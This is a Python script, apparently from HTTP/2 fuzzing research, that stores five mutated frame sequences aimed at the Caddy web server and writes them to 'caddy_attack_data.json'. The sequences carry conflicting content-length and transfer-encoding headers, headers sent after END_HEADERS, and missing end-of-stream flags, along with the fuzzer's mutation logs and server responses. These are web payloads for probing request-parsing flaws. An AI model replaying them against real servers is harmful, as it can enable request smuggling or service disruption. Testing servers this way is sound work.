import json
 
# (1)MISSING_END_STREAM
# (2)NO_MISMATCH_CHECK
# (3)HEADER_AFTER_END_HEADER

# NO_MISMATCH_CHECK content-length mismatch data-length cause Content_Length_Incomplete-Withbody
# "315": {"input":
no_missmatch_check_frm1 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/reqid=315", ":authority": "172.17.168.200", "flags": []},
"<continuation-frame-pool-1:1>": {"$content-length": "5", "flags": []},
"<continuation-frame-pool-1:2>": {"content-length": "20", "flags": []},
"<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]},
"<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\n", "flags": ["ES"]}}
# "mutations": ["Inserting subtree '<continuation-frame-pool-1>' at pos 1 of '<sequence:1>'.",
# "Inserting subtree '<continuation-frame-pool-1>' at pos 2 of '<sequence:1>'.",
# "Inserting character '$' at pos 0 of <continuation-frame-pool-1-content-len-header-name:1>."],
# "responses": ["response-code: :status 500\r\nerror: \r\nhost_header: 47.96.175.128\r\n\r\n"]}

#
# HEADER_AFTER_END_HEADER cause Content_Length_Incomplete-Withoutbody
# "61": {"input":
header_after_end_header_frm1 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/reqid=61", ":authority": "172.17.168.200", "flags": []},
"<continuation-frame-pool-1:1>": {"content-length": "5", "flags": []},
"<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]},
"<headers-frame-pool-1:1>": {":method": "_POST", ":scheme": "https", ":path": "/reqid=61", ":authority": "172.17.168.200", "content-length": "10\u001b", "flags": ["ES"]},
"<data-frame-base-2:1>": {"data": "0\r\n\r\n", "flags": []},
"<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": ["ES"]}}
# "mutations": ["Inserting subtree '<headers-frame-pool-1>' at pos 2 of '<sequence:1>'.",
# "Inserting subtree '<continuation-frame-pool-1>' at pos 1 of '<sequence:1>'.",
# "Inserting character '_' at pos 0 of <headers-frame-pool-1-method-header-value:1>.",
# "Inserting character '\\x1b' at pos 2 of <headers-frame-pool-1-content-len-header-value:1>."],
# "responses": ["response-code: \r\nerror: Protocol error\r\nhost_header: 47.96.175.128\r\n\r\n"]},

# HEADER_AFTER_END_HEADER cause MISSING_LAST_CHUNK
# "19": {"input":
header_after_end_header_frm2 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/reqid=19", ":authority": "172.17.168.200", "flags": []},
"<continuation-frame-base-2:1>": {"some-other-header": "some-other-value", "flags": []},
"<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]},
"<headers-frame-pool-1:1>": {":method": "POST\u001d", ":scheme": "https", ":path": "/reqid=19", ":authority": "172.17.168.200", "transfer-encoding~": "chunked", "flags": ["EH"]},
"<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n", "flags": ["ES"]}}
# "mutations": ["Inserting subtree '<headers-frame-pool-1>' at pos 3 of '<sequence:1>'.",
# "Inserting character '~' at pos 17 of <headers-frame-pool-1-transfer-enc-header-name:1>.",
# "Inserting character '\\x1d' at pos 4 of <headers-frame-pool-1-method-header-value:1>."],
# "responses": ["response-code: \r\nerror: Protocol error\r\nhost_header: 47.96.175.128\r\n\r\n"]},

# MISSING_END_STREAM cause MISS_LAST_CHUNK
# "203": {"input":
miss_end_stream_frm1 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/reqid=203", ":authority": "172.17.168.200", "flags": []},
"<continuation-frame-base-2:1>": {"some-other-header": "some-other-value", "flags": []},
"<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]},
"<data-frame-base-2:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\nBBBBB", "flags": []},
"<padded-headers-frame-pool-1:1>": {":method": "POST\u0011", ":scheme": "https", ":path": "/reqid=203", ":authority": "172.17.168.200", "content-length": "10", "flags": ["P", "ES", "EH"], "padding": "5\r\nBBBBB\r\n0\r\n\r\n"},
"<data-frame-base-1:1>": {"data": "5\r\nBBBBB\r\n0\r\n\r\n", "flags": ["ES"]}}
# "mutations": ["Inserting subtree '<padded-headers-frame-pool-1>' at pos 4 of '<sequence:1>'.",
# "Inserting character '\\x11' at pos 4 of <padded-headers-frame-pool-1-method-header-value:1>."],
# "responses": ["response-code: \r\nerror: Protocol error\r\nhost_header: 47.96.175.128\r\n\r\n"]},

# MISSING_END_STREAM cause Content_Length_Incomplete-Withbody
# "365": {"input":
miss_end_stream_frm2 = {"<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/reqid=365", ":authority": "172.17.168.200", "flags": []},
"<continuation-frame-pool-1:1>": {"content-length": "20", "flags": []},
"<continuation-frame-base-2:1>": {"some-other-header": "some-other-value", "flags": []},
"<continuation-frame-base-1:1>": {"some-header": "some-value", "flags": ["EH"]},
"<data-frame-base-2:1>": {"data": "5\r\nBBBBB\r\n", "flags": []},
"<headers-frame-pool-1:1>": {":method": "GET", ":scheme": "https", ":path": "/reqid=365", ":authority": "172.17.168.200", "-transfer-encoding": "chunked", "flags": ["ES"]},
"<data-frame-base-1:1>": {"data": "0\r\n\r\n", "flags": ["ES"]}}
# "mutations": ["Inserting subtree '<continuation-frame-pool-1>' at pos 1 of '<sequence:1>'.",
# "Inserting subtree '<headers-frame-pool-1>' at pos 5 of '<sequence:1>'.",
# "Inserting character '-' at pos 0 of <headers-frame-pool-1-transfer-enc-header-name:1>."],
# "responses": ["response-code: \r\nerror: Protocol error\r\nhost_header: 47.96.175.128\r\n\r\n"]},

anamaly_names = ['no_missmatch_check_frm1','header_after_end_header_frm1','header_after_end_header_frm2', 'miss_end_stream_frm1','miss_end_stream_frm2']
anamaly_frames = [no_missmatch_check_frm1,header_after_end_header_frm1,header_after_end_header_frm2, miss_end_stream_frm1,miss_end_stream_frm2]
caddy = {}
for i in range(len(anamaly_names)):
    caddy[anamaly_names[i]]=anamaly_frames[i]

with open('caddy_attack_data.json', 'w') as f:
    json_str = json.dumps(caddy,indent=0)
    f.write(json_str)
    f.write('\n')
